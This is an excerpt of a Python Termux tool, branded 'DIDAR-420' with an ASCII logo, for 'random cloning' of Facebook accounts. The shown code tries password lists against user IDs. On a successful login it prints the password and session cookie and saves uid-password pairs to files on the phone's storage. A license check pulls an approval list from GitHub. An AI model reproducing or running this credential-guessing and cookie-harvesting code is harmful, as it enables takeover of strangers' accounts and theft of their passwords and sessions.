...
`7MM"""Yb. `7MMF'`7MM"""Yb.      db      `7MM"""Mq.  
  MM    `Yb. MM    MM    `Yb.   ;MM:       MM   `MM. 
  MM     `Mb MM    MM     `Mb  ,V^MM.      MM   ,M9  
  MM      MM MM    MM      MM ,M  `MM      MMmmdM9   
  MM     ,MP MM    MM     ,MP AbmmmqMA     MM  YM.   
  MM    ,dP' MM    MM    ,dP'A'     VML    MM   `Mb. 
.JMMmmmdP' .JMML..JMMmmmdP'.AMA.   .AMMA..JMML. .JMM.
                                                         

 \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m 𝐌𝐎𝐇𝐀𝐌𝐌𝐄𝐃 𝐃𝐈𝐃𝐀𝐑     \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m 𝐌𝐎𝐇𝐀𝐌𝐌𝐄𝐃 𝐃𝐈𝐃𝐀𝐑     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mDIDAR-420        \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning      \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mDE BRAND            \033[1;93m|
 ...
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m 𝐃𝐈𝐃𝐀𝐑  TERMUX COMMEND ZONE....            \033[1;93m|
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45m𝐃𝐈𝐃𝐀𝐑-420-OK🌺\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝐃𝐈𝐃𝐀𝐑-420-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[𝐃𝐈𝐃𝐀𝐑-420-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝐃𝐈𝐃𝐀𝐑-420-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}𝐃𝐈𝐃𝐀𝐑-420{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def superuser():
    ...
    id = "71".join(uuid)
    print(logo)
    DARK=requests.get("https://raw.githubusercontent.com/nobita2424/D-R/main/drapproval.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        xxr()
        ...
        os.system('am start https://wa.me/+8801774650180?text=' + tks)
        superuser()        
superuser()
